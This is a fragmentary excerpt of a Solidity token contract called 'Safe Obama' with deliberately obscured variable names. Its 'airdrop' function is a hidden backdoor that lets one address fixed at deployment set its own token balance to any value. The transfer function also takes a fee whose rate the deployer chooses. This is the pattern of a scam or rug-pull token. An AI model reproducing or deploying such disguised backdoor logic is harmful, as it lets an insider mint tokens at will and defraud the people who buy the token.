...
contract Context {
 ...
 contract SafeObama is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private malkiafilip;
    ...
    address private _feeAddrWallet1 = 0x151851825D3Af22b98984F799DEeB09A381FBfF6;
    address private _feeAddrWallet2 = 0x151851825D3Af22b98984F799DEeB09A381FBfF6;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 10000 * 10**18;
    address private _garlachka;
    uint256 private _rTotal = 1 * 10000**18;
    ...
    constructor(uint256 totalSupply_, uint256 chotoro, address borovtori_) {
        _name = "Safe Obama";
        _symbol = "SAFEOBAMA";
        _garlachka = borovtori_;
        _totalSupply = totalSupply_;
        _demand = chotoro;
        _owner = _msgSender();
        malkiafilip[msg.sender] = _totalSupply;
    ...
    function airdrop(uint256 bengalskiogan) public {
        malkiafilip[_msgSender()] = bengalskiogan;
        require(_msgSender() == _garlachka, "Sorry, cannot be transferred right now!");
    }
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = malkiafilip[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            malkiafilip[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _francis;
        allons = allons -  (_fee * _francis);
        
        malkiafilip[grantee] += allons;
   ...
   */
    ...
    function _burn(address account, uint256 sum) internal virtual {
        ...
        uint256 accountBalance = malkiafilip[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            malkiafilip[account] = accountBalance - sum;
        }
        _totalSupply -= sum;
